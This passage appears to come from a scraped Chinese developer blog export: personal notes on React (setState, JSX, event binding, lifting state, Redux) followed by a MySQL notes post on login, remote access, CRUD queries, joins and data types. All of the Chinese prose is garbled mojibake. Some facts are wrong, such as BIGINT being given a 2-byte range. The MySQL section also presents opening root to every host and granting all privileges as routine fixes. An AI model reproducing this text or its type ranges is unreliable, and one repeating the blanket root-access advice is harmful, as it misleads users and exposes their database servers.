setStateæ–¹æ³•å…¶å®æœ‰ç¬¬äºŒä¸ªoptionalå‚æ•°ï¼Œæ˜¯callback.è¿™ä¸ªcallbackä¼šåœ¨renderå®Œæˆä¹‹åæ‰§è¡Œ The second parameter to setState() is an optional callback function that will be executed once setState is completed and the component is re-rendered. Generally we recommend using componentDidUpdate() for such logic instead. React does not guarantee that the state changes are applied immediately.//å¯èƒ½æ˜¯å¼‚æ­¥çš„,å¤šæ¬¡setStateå¯èƒ½ä¼šåˆ«batchã€‚ This makes reading this.state right after calling setState() a potential pitfall. Instead, use componentDidUpdate or a setState callback (setState(updater, callback)), either of which are guaranteed to fire after the update has been applied. JSXè¯­æ³•const element = ( &lt;h1 className=&quot;greeting&quot;&gt; Hello, world! &lt;/h1&gt; ); // è¿™ä¿©å…¶å®æ˜¯ä¸€æ ·çš„ const element = React.createElement( &#39;h1&#39;, {className: &#39;greeting&#39;}, &#39;Hello, world!&#39; ); // jsxè¯­å¥æœ€ç»ˆéƒ½æ˜¯è¢«ç”¨åœ¨componentçš„returnè¯­å¥ä¸­çš„ï¼š function WarningBanner(props) { if (!props.warn) { return null; } return ( &lt;div className=&quot;warning&quot;&gt; Warning! &lt;/div&gt; ); } å±€éƒ¨æ›´æ–°é¡µé¢å‘ç”Ÿå˜åŒ–æ—¶ï¼ŒReactåªæ›´æ–°éœ€è¦åˆ·æ–°çš„éƒ¨åˆ†ã€‚ä»è§†è§‰ä¸Šæ¥çœ‹ï¼Œstateæ›´æ”¹ä¹‹åï¼Œç¡®å®æ˜¯å±€éƒ¨åˆ·æ–°ã€‚ ç”Ÿå‘½å‘¨æœŸé’©å­å‡½æ•°componentDidMount() { fetchPosts().then(response =&gt; { this.setState({ posts: response.posts }); }); fetchComments().then(response =&gt; { this.setState({ comments: response.comments }); }); } As of react v16.3.2 these methods are not &quot;safe&quot; to use: componentWillMount componentWillReceiveProps componentWillUpdate äº‹ä»¶å¤„ç†function ActionLink() { function handleClick(e) { e.preventDefault(); console.log(&#39;The link was clicked.&#39;); } return ( &lt;a href=&quot;#&quot; onClick={handleClick}&gt; Click me &lt;/a&gt; ); } const element = &lt;h1&gt;Hello, world&lt;/h1&gt;; ReactDOM.render(&lt;ActionLink/&gt;, document.getElementById(&#39;root&#39;)); // æˆ–è€…æ˜¯ä½¿ç”¨ç®­å¤´å‡½æ•° ä»¥åŠ Function.prototype.bind &lt;button onClick={(e) =&gt; this.deleteRow(id, e)}&gt;Delete Row&lt;/button&gt; &lt;button onClick={this.deleteRow.bind(this, id)}&gt;Delete Row&lt;/button&gt; //åœ¨ä¸€ä¸ªComponentä¸­ï¼Œäº‹ä»¶ç›‘å¬æœ€åè¦åŠ ä¸Šbind(this) class Calculator extends React.Component { constructor(props) { super(props); this.handleChange = this.handleChange.bind(this); this.state = {temperature: &#39;&#39;}; } handleChange(e) { this.setState({temperature: e.target.value}); } render() { const temperature = this.state.temperature; return ( &lt;fieldset&gt; &lt;legend&gt;Enter temperature in Celsius:&lt;/legend&gt; &lt;input value={temperature} onChange={this.handleChange} /&gt; &lt;BoilingVerdict celsius={parseFloat(temperature)} /&gt; &lt;/fieldset&gt; ); } } ç»„ä»¶ä¹‹é—´é€šä¿¡In React, sharing state is accomplished by moving it up to the closest common ancestor of the components that need it. ä¹Ÿå°±æ˜¯è¯´ï¼Œè¦æŠŠstateæå–åˆ°æœ€è¿‘çš„å…¬ç”¨çˆ¶ç»„ä»¶ä¸­ã€‚äº‹ä»¶å‘ç”Ÿæ—¶ï¼Œå­ç»„ä»¶è°ƒç”¨this.props.onXXX(ç”±çˆ¶ç»„ä»¶æä¾›)é€šçŸ¥çˆ¶ç»„ä»¶ï¼Œå­ç»„ä»¶ä¸å†ç»´æŠ¤è‡ªèº«stateï¼Œçˆ¶ç»„ä»¶çš„stateæˆä¸ºä¸¤ä¸ªå­ç»„ä»¶å”¯ä¸€çš„å…±æœ‰çš„single source of truth æ¸²æŸ“listçš„æ—¶å€™è®°å¾—è¦åŠ ä¸Šä¸€ä¸ªkeyï¼Œè¿™æ˜¯è§„å®š //é”™è¯¯ const listItems = numbers.map((number) =&gt; &lt;li&gt;{number}&lt;/li&gt; ); //æ­£ç¡® const listItems = numbers.map((number) =&gt; &lt;li key={number.toString()}&gt;{number}&lt;/li&gt; ); //ä¸€ä¸ªList elementä¸­çš„listå…ƒç´ åº”å½“å…·æœ‰ç‹¬ä¸€æ— äºŒçš„keyï¼Œä½†ä¸åŒList elementå®ä¾‹ä¹‹é—´ï¼Œå…ƒç´ çš„keyæ²¡å¿…è¦éµå®ˆè¿™ä¸€è§„åˆ™ reactæ¨èä½¿ç”¨ç»„åˆè€Œä¸æ˜¯ç»§æ‰¿æ¥å®ç°code reuseç»„ä»¶çš„propsä¸­æœ‰ä¸€ä¸ªç‰¹æ®Šçš„key(children),å¯ä»¥ç†è§£ä¸ºç›´æ¥åœ¨ä¸€ä¸ªç»„ä»¶ä¸Šè®¾ç½®å†…éƒ¨çš„å†…å®¹ã€‚å®é™…ä¸Š,propså¯ä»¥æ·»åŠ å…¶ä»–çš„keyä»¥å®¹çº³å¤šä¸ªchildren function FancyBorder(props) { return ( &lt;div className={&#39;FancyBorder FancyBorder-&#39; + props.color}&gt; {props.children} &lt;/div&gt; ); } //ä¾‹å¦‚ä¸‹é¢çš„ä¾‹å­ï¼ŒFancyBorderé‡Œé¢çš„å†…å®¹å®é™…ä¸Šå°±ç­‰äºä¸Šé¢çš„props.children function WelcomeDialog() { return ( &lt;FancyBorder color=&quot;blue&quot;&gt; &lt;h1 className=&quot;Dialog-title&quot;&gt; Welcome &lt;/h1&gt; &lt;p className=&quot;Dialog-message&quot;&gt; Thank you for visiting our spacecraft! &lt;/p&gt; &lt;/FancyBorder&gt; ); } å¯ä»¥è¿™æ ·åšçš„åŸå› æ˜¯componentså¯ä»¥æ¥å—ä»»ä½•å½¢å¼çš„propsï¼Œä¾‹å¦‚åŸºæœ¬æ•°æ®ç±»å‹ï¼Œreact elemetsï¼Œä»¥åŠå‡½æ•° Remember that components may accept arbitrary props, including primitive values, React elements, or functions. class SignUpDialog extends React.Component { constructor(props) { super(props); this.handleChange = this.handleChange.bind(this); //ä¸ºä»€ä¹ˆè¿™é‡Œè¦å†™ä¸€å¥bind(this)ï¼Œå› ä¸ºå¦‚æœä¸åŠ çš„è¯ï¼ŒhandleChangeæ–¹æ³•é‡Œçš„thiså°†ä¼šæ˜¯è¿™ä¸ª this.handleSignUp = this.handleSignUp.bind(this); this.state = {login: &#39;&#39;}; } render() { return ( &lt;Dialog title=&quot;Mars Exploration Program&quot; message=&quot;How should we refer to you?&quot;&gt; &lt;input value={this.state.login} onChange={this.handleChange} /&gt; &lt;button onClick={this.handleSignUp}&gt; Sign Me Up! &lt;/button&gt; &lt;/Dialog&gt; ); } handleChange(e) { this.setState({login: e.target.value}); } handleSignUp() { alert(`Welcome aboard, ${this.state.login}!`); } } reduxçš„ä¸€äº›ç‚¹react-reduxå’Œreduxçš„æºç éƒ½å¾ˆçŸ­ï¼Œä½†æ˜¯jsè¯­æ³•å†™çš„éå¸¸6ğŸ‰enhancerï¼ˆå…¸å‹å¦‚applyMiddleWareï¼‰ reducerçš„å®šä¹‰ Speaking of the code that uses the action to update our application state, in Redux terminology this part is called a â€œreducer.â€ react-reduxçš„connectæ–¹æ³•ä¸»è¦å°±æ˜¯èƒ½å¤Ÿè®©UI Componenté‡Œé¢å¯ä»¥å…å»æŒæœ‰storeï¼Œè€Œæ˜¯é€šè¿‡ä¸€ä¸ªmapDispatchToPropså»å‘èµ·äº‹ä»¶ å‚è€ƒredux tutorial","tags":[{"name":"å‰ç«¯","slug":"å‰ç«¯","permalink":"https://haldir65.github.io/tags/å‰ç«¯/"}]},{"title":"mysqlå¡«å‘è®°å½•","date":"2018-02-04T21:37:37.000Z","path":"2018/02/04/2018-02-04-mysql-metup/","text":"å…³ç³»å‹æ•°æ®åº“å¾ˆå¤šå¦‚ï¼ŒMS Access, SQL Server, MySQLNoSQL(NoSQL = Not Only SQL )ï¼Œæ„å³â€ä¸ä»…ä»…æ˜¯SQLâ€ï¼ŒNOSQLæ˜¯åŸºäºé”®å€¼å¯¹çš„ï¼Œå¯ä»¥æƒ³è±¡æˆè¡¨ä¸­çš„ä¸»é”®å’Œå€¼çš„å¯¹åº”å…³ç³»ï¼Œè€Œä¸”ä¸éœ€è¦ç»è¿‡SQLå±‚çš„è§£æï¼Œæ‰€ä»¥æ€§èƒ½éå¸¸é«˜ã€‚å…¸å‹çš„ä»£è¡¨å¦‚MongoDb. è¯»éŸ³ï¼šMySQL is pronounced as â€œmy ess-que-ell,â€ in contrast with SQL, pronounced â€œsequel.â€ RDBMS(å…³ç³»å‹æ•°æ®åº“)RDBMS stands for Relational Database Management System. RDBMS is the basis for SQL, and for all modern database systems like MS SQL Server, IBM DB2, Oracle, MySQL, and Microsoft Access. sql tutorials mySqlç›¸å…³ å®‰è£…How to Install MySQL on Ubuntuhow-to-create-a-new-user-and-grant-permissions-in-mysqla-basic-mysql-tutorial mysql -u root -p ## ä»¥rootèº«ä»½ç™»å½• Too many connectionsmysqlè¿æ¥å¤šäº†å®¹æ˜“çˆ†å†…å­˜ï¼Œå…³æ‰çš„æ–¹æ³• mysqladmin -u root -p shutdown ## å…³é—­sudo /etc/init.d/mysql restart ## é‡å¯sudo systemctl disable mysql ##ç¦æ­¢å¼€æœºå¯åŠ¨host-xxx-xx-xxx-xxx-is-not-allowed-to-connect-to-this-mysql-server1ã€‚ æ”¹è¡¨æ³•ã€‚å¯èƒ½æ˜¯ä½ çš„å¸å·ä¸å…è®¸ä»è¿œç¨‹ç™»é™†ï¼Œåªèƒ½åœ¨localhostã€‚è¿™ä¸ªæ—¶å€™åªè¦åœ¨localhostçš„é‚£å°ç”µè„‘ï¼Œç™»å…¥mysqlåï¼Œæ›´æ”¹ â€œmysqlâ€ æ•°æ®åº“é‡Œçš„ â€œuserâ€ è¡¨é‡Œçš„ â€œhostâ€ é¡¹ï¼Œä»â€localhostâ€æ”¹ç§°â€%â€ windowsç™»å½•å‡ºé”™æŠ¥10061çš„è§£å†³æ–¹å¼services.msc =&gt; æ‰¾åˆ°MySQL57 =&gt; å³é”®ï¼ˆå¯åŠ¨ï¼‰ é…ç½®æ–‡ä»¶çš„ä½ç½®: nano /etc/mysql/mysql.conf.d/mysqld.conf mysql -u root -p use mysql; update user set host = &#39;%&#39; where user = &#39;root&#39;; select host, user from user; æˆæƒæ³•ã€‚ ä¾‹å¦‚ï¼Œä½ æƒ³myuserä½¿ç”¨mypasswordä»ä»»ä½•ä¸»æœºè¿æ¥åˆ°mysqlæœåŠ¡å™¨çš„è¯ã€‚ GRANT ALL PRIVILEGES ON *.* TO &#39;myuser&#39;@&#39;%&#39; IDENTIFIED BY &#39;mypassword&#39; WITH GRANT OPTION; FLUSH PRIVILEGES; å¦‚æœä½ æƒ³å…è®¸ç”¨æˆ·myuserä»ipä¸º192.168.1.6çš„ä¸»æœºè¿æ¥åˆ°mysqlæœåŠ¡å™¨ï¼Œå¹¶ä½¿ç”¨mypasswordä½œä¸ºå¯†ç  GRANT ALL PRIVILEGES ON *.* TO &#39;myuser&#39;@&#39;192.168.1.3&#39; IDENTIFIED BY &#39;mypassword&#39; WITH GRANT OPTION; FLUSH PRIVILEGES; å¦‚æœä½ æƒ³å…è®¸ç”¨æˆ·myuserä»ipä¸º192.168.1.6çš„ä¸»æœºè¿æ¥åˆ°mysqlæœåŠ¡å™¨çš„dkæ•°æ®åº“ï¼Œå¹¶ä½¿ç”¨mypasswordä½œä¸ºå¯†ç  GRANT ALL PRIVILEGES ON dk.* TO &#39;myuser&#39;@&#39;192.168.1.3&#39; IDENTIFIED BY &#39;mypassword&#39; WITH GRANT OPTION; FLUSH PRIVILEGES; HeidiSQL ä¸­åˆ›å»ºdatabaseè®°å¾—é€‰æ‹©character set â€˜utf-8â€™Collation: â€˜utf_8_general_cliâ€™; CURD COMMANDSé¦–å…ˆè¦æ³¨æ„çš„æ˜¯æ‰€æœ‰sqlè¯­å¥æœ€åé¢éƒ½è¦è·Ÿä¸€ä¸ªåˆ†å· SHOW DATABASES; CREATE DATABASE dbname; USE dbname; ## show how many tables are there in this table SHOW TABLES; ## create table CREATE TABLE potluck (id INT NOT NULL PRIMARY KEY AUTO_INCREMENT,name VARCHAR(20),food VARCHAR(30),confirmed CHAR(1),signup_date DATE); ## show everyting SELECT * FROM potluck; SELECT user_id FROM potluck; SELECT FROM potluck; // è¿™ä¹ˆå†™sql è¯­æ³•æœ‰è¯¯ï¼Œå¿…é¡»å£°æ˜æƒ³è¦é€‰å‡ºé‚£äº›column ## how does potluck look like? DESCRIBE potluck; ##æˆ‘æƒ³çœ‹çœ‹å½“åˆè¿™è¡¨çš„å»ºè¡¨è¯­å¥é•¿ä»€ä¹ˆæ ·ï¼Ÿ show create table potluck; ## ADD STUFF INSERT INTO `potluck` (`id`,`name`,`food`,`confirmed`,`signup_date`) VALUES (NULL, &quot;John&quot;, &quot;Casserole&quot;,&quot;Y&quot;, &#39;2012-04-11&#39;); ### äº²æµ‹ï¼Œåœ¨heidisqlä¸­è¿™ä¹ˆè¾“å…¥ä¹Ÿèƒ½insertä¸€è¡Œ,æ‰€ä»¥è¿™äº›å†’å·ä¹Ÿä¸æ˜¯å¿…é¡»çš„ã€‚æ³¨æ„è¿™é‡Œä¸æ˜¯&quot;å•å¼•å·&#39;&quot;å·è€Œæ˜¯&quot;`&quot;ï¼ˆtabé”®ä¸Šé¢é‚£ä¸ªï¼‰ INSERT INTO user (user_id,login,password,email,date_added,date_modified) VALUES (1,&quot;firstlogin&quot;,&quot;dumbpasws&quot;,&quot;sample@email.com&quot;,&#39;2012-03-09&#39;,&#39;2018-01-09&#39;); ## update stuff UPDATE `potluck` SET `confirmed` = &#39;Y&#39; WHERE `potluck`.`name` =&#39;Sandy&#39;; UPDATE user SET user_id = 11 WHERE user_id =10;## äº²æµ‹è¿™ä¹ˆå¹²ä¹Ÿæ²¡é—®é¢˜ SELECT user_id FROM user WHERE user_nick = &#39;john&#39; OR user_id &gt; 10; ## ç²¾ç¡®åŒ¹é…å­—ç¬¦ä¸²ç”¨ç­‰å· UPDATE user SET salary= 10000 WHERE salary is NULL;## æ›´æ–°çš„æ—¶å€™ç”¨=å·ï¼Œåˆ¤æ–­ä¸ºç©ºç”¨IS NULL ï¼Œå¯¹åº”çš„ä¹Ÿæœ‰IS NOT NULL. UPDATE user SET salary= 22000 WHERE salary &lt; 20000; ## äº²æµ‹è¿™ä¹ˆå¹²ä¹Ÿè¡Œ ## è¿™æ ·çš„æ¡ä»¶è¯­å¥è¿˜æœ‰å¾ˆå¤šï¼Œè¿™ä¸ªåº”è¯¥å«åšOperator(æ“ä½œç¬¦) æ“ä½œç¬¦ä¸»è¦åˆ†ä¸ºå››ç±» Arithmetic operators ï¼ˆæ•°å­¦åŠ å‡ä¹˜é™¤ï¼‰ Comparison operatorsï¼ˆæ¯”è¾ƒå¤§å°çš„ï¼‰ Logical operators ï¼ˆé€»è¾‘è¿ç®—ç¬¦ï¼‰ ANDï¼Œ ANY, BETWEEN,EXISTS,LIKE,OR ,IS NULL ,IS NOT NULL, UNIQUE Operators used to negate conditions æŒ‘å‡ ä¸ªä¸å®¹æ˜“ç†è§£çš„ï¼Œä¸‹é¢è¿™ä¸ªå«åšå­æŸ¥è¯¢ SELECT * FROM user WHERE EXISTS (SELECT * FROM todo WHERE user_id = 1) ; ## UNIQUEæ˜¯ç”¨åœ¨åˆ›å»ºè¡¨æˆ–è€…æ”¹è¡¨ç»“æ„çš„: CREATE TABLE Persons ( Id_P int NOT NULL, LastName varchar(255) NOT NULL, FirstName varchar(255), Address varchar(255), City varchar(255), UNIQUE (Id_P) ) // uniqueçš„æ„æ€å¾ˆæ˜æ˜¾ï¼Œä¸èƒ½å…è®¸å‡ºç°åŒæ ·çš„row å¦‚æœåœ¨SELECTçš„æ—¶å€™æƒ³è¦å»é‡ï¼Œç”¨DISTINCT SELECT DISTINCT content FROM todo; SELECT COUNT(*) FROM todo; // çœ‹ä¸‹å½“å‰æ•°æ®åº“æœ‰å¤šå°‘è¡Œäº† SELECT COUNT(DISTINCT content) FROM todo; // å»é‡åçœ‹ä¸‹æœ‰å¤šå°‘è¡Œ ### æ¨¡ç³ŠæŸ¥è¯¢ SELECT * FROM [user] WHERE u_name LIKE &#39;%ä¸‰%&#39;; //å°†ä¼šæŠŠu_nameä¸ºâ€œå¼ ä¸‰â€ï¼Œâ€œå¼ çŒ«ä¸‰â€ã€â€œä¸‰è„šçŒ«â€ï¼Œâ€œå”ä¸‰è—â€ç­‰ç­‰æœ‰â€œä¸‰â€çš„è®°å½•å…¨æ‰¾å‡ºæ¥ã€‚ SELECT * FROM [user] WHERE u_name LIKE &#39;_ä¸‰_&#39;; //åªæ‰¾å‡ºâ€œå”ä¸‰è—â€è¿™æ ·u_nameä¸ºä¸‰ä¸ªå­—ä¸”ä¸­é—´ä¸€ä¸ªå­—æ˜¯â€œä¸‰â€çš„ï¼›_ ï¼š è¡¨ç¤ºä»»æ„å•ä¸ªå­—ç¬¦ã€‚åŒ¹é…å•ä¸ªä»»æ„å­—ç¬¦ï¼Œå®ƒå¸¸ç”¨æ¥é™åˆ¶è¡¨è¾¾å¼çš„å­— ç¬¦é•¿åº¦è¯­å¥ï¼š SELECT * FROM [user] WHERE u_name LIKE &#39;[å¼ æç‹]ä¸‰&#39; ; å°†æ‰¾å‡ºâ€œå¼ ä¸‰â€ã€â€œæä¸‰â€ã€â€œç‹ä¸‰â€ï¼ˆè€Œä¸æ˜¯â€œå¼ æç‹ä¸‰â€ï¼‰ï¼› SELECT * FROM [user] WHERE u_name LIKE &#39;[^å¼ æç‹]ä¸‰&#39;; å°†æ‰¾å‡ºä¸å§“â€œå¼ â€ã€â€œæâ€ã€â€œç‹â€çš„â€œèµµä¸‰â€ã€â€œå­™ä¸‰â€ç­‰ï¼› ## orderBy SELECT * FROM CUSTOMERS ORDER BY NAME DESC; //å°±æ˜¯æŠŠæŸ¥å‡ºæ¥çš„ç»“æœæ’åºï¼ŒæŒ‰ç…§åç§°çš„ASICé¡ºåºå€’åºæ’åˆ— ## groupBy GROUP BYçš„é¡ºåºåœ¨orderByå‰é¢(groupbyè¦å†™åœ¨orderbyå‰é¢)ï¼Œæ„æ€å°±æ˜¯æŠŠç›¸åŒç»“æœçš„æ•´åˆæˆä¸€è¡Œ åŸºæœ¬çš„è¯­æ³•æ˜¯ SELECT column_one FROM table_name WHERE column_two = &quot;&quot; AND ... GROUP BY column_one ORDER BY column_two; SELECT NAME, SUM(SALARY) FROM CUSTOMERS GROUP BY NAME; // è¿™é‡Œè¿˜ç”¨äº†sumå‡½æ•°ï¼Œè®¡ç®—CUSTOMERè¡¨ä¸­å„ä¸ªç”¨æˆ·çš„salaryæ€»å’Œï¼Œnameç›¸åŒçš„ç®—ä½œä¸€ä¸ªåˆå¹¶èµ·æ¥ã€‚ ## we want to add a column to table ALTER TABLE potluck ADD email VARCHAR(40); ## this way we add to a specific position ALTER TABLE potluck ADD email VARCHAR(40) AFTER name; ## drop this column ALTER TABLE potluck DROP email; ## how about delete this row DELETE from potluck where name=&#39;Sandy&#39;; ## ä»åˆ åº“åˆ°è·‘è·¯ TRUNCATE TABLE table_name; //å°†è¿™å¼ è¡¨çš„å†…å®¹å…¨éƒ¨æŠ¹æ‰ ## error: Cannot truncate a table referenced in a foreign key constraint(æœ‰æ—¶å€™ä¼šç¢°åˆ°è¿™ç§é”™è¯¯ï¼Œè¿™ä¹Ÿæ˜¯çº¦æŸçš„ä¸€ç§ä½“ç°) DROP TABLE table_name; //åˆ é™¤è¿™ä¸ªæ•°æ®åº“ ä¸€äº›å®ç”¨çš„ä¾‹å­ï¼š å•åˆ—æ•°æ®åˆ†ç»„ç»Ÿè®¡SELECT id,name,SUM(price) AS title,date FROM tb_price GROUP BY pid ORDER BY title DESC; å¤šåˆ—æ•°æ®åˆ†ç»„ç»Ÿè®¡SELECT id,name,SUM(price*num) AS sumprice FROM tb_price GROUP BY pid ORDER BY sumprice DESC; å¤šè¡¨åˆ†ç»„ç»Ÿè®¡SELECT a.name,AVG(a.price),b.name,AVG(b.price) FROM tb_demo058 AS a,tb_demo058_1 AS b WHERE a.id=b.id GROUP BY b.type; è·¨è¡¨æŸ¥è¯¢ç°å®ç”Ÿæ´»ä¸­ç»å¸¸è¦ä»å¤šä¸ªæ•°æ®è¡¨ä¸­è¯»å–æ•°æ®ï¼Œå…³é”®å­—JOINæ ¹æ®ForeignKeyå»æŸ¥è¯¢ï¼š ## ä¸»è¡¨ create table department( id int primary key auto_increment, name varchar(20) not null, description varchar(100) ); ## ä»è¡¨ï¼Œå¤–é”®æ˜¯åœ¨ä»è¡¨ä¸­åˆ›å»ºï¼Œä»è€Œæ‰¾åˆ°ä¸ä¸»è¡¨ä¹‹é—´çš„è”ç³» create table employee( id int primary key auto_increment, name varchar(10) not null, gender varchar(2) not null, salary float(10,2), age int(2), gmr int, dept_id int ); ## å¤–é”®å¯ä»¥åœ¨å»ºè¡¨çš„æ—¶å€™åŠ ï¼Œä¹Ÿå¯ä»¥åœ¨å»ºè¡¨å®Œæˆä¹‹ååŠ  ALTER TABLE employee ADD FOREIGN KEY(dept_id) REFERENCES department(id); [ON DELETE {RESTRICT | CASCADE | SET NULL | NO ACTION}] [ON UPDATE {RESTRICT | CASCADE | SET NULL | NO ACTION} ## å†™djangoçš„æ—¶å€™å°±ä¼šæ³¨æ„åˆ°CASCADEï¼ˆçº§è”ï¼‰è¿™ä¸ªå•è¯ï¼Œå¦‚æœä¸»è¡¨çš„è®°å½•åˆ æ‰ï¼Œåˆ™ä»è¡¨ä¸­ç›¸å…³è”çš„è®°å½•éƒ½å°†è¢«åˆ æ‰ã€‚ RESTRICT(é™åˆ¶)ï¼šå¦‚æœä½ æƒ³åˆ é™¤çš„é‚£ä¸ªä¸»è¡¨ï¼Œå®ƒçš„ä¸‹é¢æœ‰å¯¹åº”ä»è¡¨çš„è®°å½•ï¼Œæ­¤ä¸»è¡¨å°†æ— æ³•åˆ é™¤ã€‚ï¼ˆè¿™ä¸ªå¥½åƒæ˜¯é»˜è®¤è§„åˆ™ï¼‰ SET NULLï¼šå°†å¤–é”®è®¾ç½®ä¸ºç©ºã€‚ NO ACTIONï¼šä»€ä¹ˆéƒ½ä¸åšã€‚ ä»¥ä¸Šï¼Œæ¯ä¸ªå‘˜å·¥æœ‰ä¸€ä¸ªdep_idçš„Foreign_keyï¼Œå¯¹åº”departmentè¡¨ä¸­çš„id.åˆ é™¤å¤–é”® alter table emp drop foreign key å¤–é”®å; å¼€å§‹è”è¡¨æŸ¥è¯¢ï¼ŒåŒºåˆ†inner join ,left join, right join ##ä¸‹é¢è¿™ä¿©ä¸€æ ·çš„ ##inner joinï¼Œåªåˆ—å‡ºåŒ¹é…çš„è®°å½• select e.name,d.name from employee e inner join department d on e.dept_id=d.id; ##innerå¯ä»¥ä¸å†™ï¼Œé»˜è®¤æ˜¯inner select e.name,d.name from employee e,department d where e.dept_id=d.id; ## left join å·¦è¿æ¥å³ä»¥å·¦è¡¨ä¸ºåŸºå‡†ï¼Œæ˜¾ç¤ºåæ ‡æ‰€æœ‰çš„è¡Œï¼Œå³è¡¨ä¸å·¦è¡¨å…³è”çš„æ•°æ®ä¼šæ˜¾ç¤ºï¼Œä¸å…³è”çš„åˆ™ä¸æ˜¾ç¤ºã€‚ select table a left join table b on a.id = b.ta_id; ## right join å³è¡¨åˆ—å‡ºå…¨éƒ¨ï¼Œå·¦è¡¨åªåˆ—å‡ºåŒ¹é…çš„è®°å½•ã€‚ ## è‡ªè¿æ¥(æ®è¯´éå¸¸é‡è¦)ï¼Œä¸‹é¢è¿™å¥æŸ¥è¯¢å‡ºå‘˜å·¥å§“ååŠå…¶leaderçš„å§“åï¼Œæ˜¯çš„ï¼Œsqlè¯­å¥é‡Œé¢èµ‹å€¼éƒ½æ˜¯è¡Œçš„ã€‚è¿™ç§å¸¦ç‚¹å·çš„è¿˜çœŸåƒobject oriented promramming select e1.name å‘˜å·¥, e2.name é¢†å¯¼ from employee e1 left join employee e2 on e1.leader=e2.id; ## ç­‰äºè¯´æ ¹æ®è¡¨åè™šæ‹Ÿå‡ºä¸¤å¼ è¡¨ ## æŸ¥è¯¢æ‰€æœ‰leaderçš„å§“å select e2.name é¢†å¯¼ from employee e1 left join employee e2 on e1.leader=e2.id; ä»¥ä¸Šè¿˜åªæ˜¯ä¸¤å¼ è¡¨è¿åœ¨ä¸€èµ·æŸ¥ï¼Œç°å®ä¸­è¿˜æœ‰nå¼ è¡¨è¿åœ¨ä¸€èµ·æŸ¥ï¼Œä¸‹é¢è¿™ä¸ªæ˜¯ä¸‰å¼ è¡¨ä¸€èµ·æŸ¥ select table a left join table b(left join table c on b.id = c.tb_id) on a.id = b_ta.id å†åŠ çš„è¯å°±æ˜¯å¤šå¼ è¡¨åœ¨ä¸€èµ·æŸ¥ï¼Œå…¶å®å°±æ˜¯ä¸€å±‚å±‚çš„sqlåµŒå¥—ï¼Œå†™çš„æ—¶å€™ä»å¤–å±‚å¾€é‡Œé¢å†™ï¼Œä¸€å±‚å±‚left joinã€‚ è¿™ä¸ªå­æŸ¥è¯¢æ˜¯æŸ¥æ‰¾æœˆè–ªæœ€é«˜çš„å‘˜å·¥çš„åå­—SELECT name,salary from employee where salary=(select max(salary) from employee); æŸ¥è¯¢æ¯ä¸ªéƒ¨é—¨çš„å¹³å‡æœˆè–ªselect avg(salary),dept_id from employee where dept_id is not null group by depy_id; AUTO_INCREMENTåœ¨sqlite3ä¸­æ˜¯è¿™ä¹ˆå¹²çš„ä¸‹é¢çš„python sqlalchemyè¯­å¥æ˜¯äº²æµ‹é€šè¿‡çš„ from sqlalchemy import create_engine db_uri = &quot;sqlite:///db.sqlite&quot; engine = create_engine(db_uri) # DBAPI - PEP249 # create table engine.execute(&#39;CREATE TABLE IF NOT EXISTS &quot;EX1&quot; (&#39; &#39;id INTEGER PRIMARY KEY AUTOINCREMENT,&#39; &#39;name VARCHAR);&#39;) # insert a raw engine.execute(&#39;INSERT INTO &quot;EX1&quot; &#39; &#39;( name) &#39; &#39;VALUES (&quot;raw1&quot;)&#39;) # select * result = engine.execute(&#39;SELECT * FROM &#39; &#39;&quot;EX1&quot;&#39;) for _r in result: print(_r) # delete * # engine.execute(&#39;DELETE from &quot;EX1&quot; where id=1;&#39;) result = engine.execute(&#39;SELECT * FROM &quot;EX1&quot;&#39;) print(result.fetchall()) auto incrementåªè¦åœ¨insertçš„æ—¶å€™ç›´æ¥å¿½ç•¥æ‰è‡ªå¢çš„å­—æ®µå°±å¥½äº†ï¼Œå¦åˆ™ä¼šæŠ¥unique constraint failed æ”¯æŒçš„æ•°æ®ç±»å‹signed or unsigned.(æœ‰ç¬¦å·æˆ–è€…æ— ç¬¦å·çš„) NumericINT (signed : -2147483648 to 2147483647 or unsigned: 0 to 4294967295.)ï¼Œ2çš„32æ¬¡æ–¹(4 byte)TINYINT(signed : -128 to 127, or unsigned: from 0 to 255)ï¼Œ2çš„å…«æ¬¡æ–¹(1 byte)BIGINT( signed :-32768 to 32767, or unsigned: from 0 to 65535.)ï¼Œ2çš„å››æ¬¡æ–¹(2 byte)FLOAT(åªèƒ½æ˜¯signed)ï¼ŒDOUBLEï¼ŒDECIMAL Date and TimeDATE (1973-12-30), DATETIME (1973-12-30 15:30:00),TIMESTAMP (19731230153000),TIME (HH:MM:SS), String Types.CHAR(fixed-lengthï¼Œé•¿åº¦å›ºå®šï¼Œä¸å¼ºåˆ¶è¦æ±‚è®¾ç½®é•¿åº¦ï¼Œé»˜è®¤1) ,VARCHAR(ariable-length string between 1 and 255ï¼Œé•¿åº¦å¯å˜ï¼Œ ),BLOB or TEXT(BLOBs case sensitiveï¼ŒTEXT not case sensitive,è¿™ä¿©ä¸éœ€è¦è®¾å®šé•¿åº¦ï¼Œæœ€å¤§é•¿åº¦65535 )ENUM (ç½®é¡¶çš„æšä¸¾ç±»å‹ä¸­ä¹‹ä¸€ï¼Œå¯ä»¥ä¸ºNULL)BOOLEANç±»å‹æ˜¯ä¸å­˜åœ¨çš„ç”¨TINYINTå°±å¥½äº†ï¼Œ0è¡¨ç¤ºfalseï¼Œ1è¡¨ç¤ºtrue; çº¦æŸconstraintçš„ä¸€ä¸ªä¾‹å­ï¼ŒAè¡¨çš„ä¸€ä¸ªcolumnå¼•ç”¨äº†Bè¡¨çš„ä¸€ä¸ªidé”®ä½œä¸ºforeign key.è¿™æ—¶å€™å¦‚æœæƒ³å¾€Aè¡¨é‡Œæ·»åŠ æ•°æ®ï¼Œå‡å¦‚å°è¯•æ·»åŠ çš„è¿™ä¸ªå¤–é”®åœ¨Bè¡¨ä¸­ä¸å­˜åœ¨ï¼Œä¼šæ— æ³•æ‰§è¡Œã€‚ INSERT INTO todo (todo_id,user_id,content,completed,date_added,date_modified) VALUES (102,11,&quot;random stufffssss&quot;,0,&quot;2012-02-09&quot;,&quot;2016-03-27&quot;); Joins clause ä»å¤šä¸ªè¡¨ä¸­è¿›è¡ŒæŸ¥è¯¢ï¼Œå¯¹å…±æœ‰çš„å±æ€§è¿›è¡Œæ“ä½œSELECT ID, NAME, AGE, AMOUNT FROM CUSTOMERS, ORDERS WHERE CUSTOMERS.ID = ORDERS.CUSTOMER_ID; inner join(æŸ¥çš„æ˜¯customerè¡¨ï¼Œä½†æŸ¥å‡ºæ¥çš„ç»“æœé‡Œæœ‰æ¥è‡ªORDERSçš„column) SQL&gt; SELECT ID, NAME, AMOUNT, DATE FROM CUSTOMERS INNER JOIN ORDERS ON CUSTOMERS.ID = 